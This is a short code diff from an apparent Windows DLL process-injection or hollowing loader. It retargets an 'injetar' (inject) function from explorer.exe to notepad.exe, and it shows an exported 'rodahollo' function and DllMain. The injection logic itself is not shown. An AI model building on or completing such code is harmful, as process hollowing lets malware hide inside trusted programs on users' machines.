@@ -221,7 +221,7 @@ public:
 std::wstring injetar() {
     wchar_t windowsDir[MAX_PATH];
     GetWindowsDirectory(windowsDir, MAX_PATH);
-    return std::wstring(windowsDir) + L"\\explorer.exe";
+    return std::wstring(windowsDir) + L"\\notepad.exe";
 }
 
 extern "C" __declspec(dllexport) BOOL rodahollo() {
@@ -250,3 +250,4 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     }
     return TRUE;
 }
+
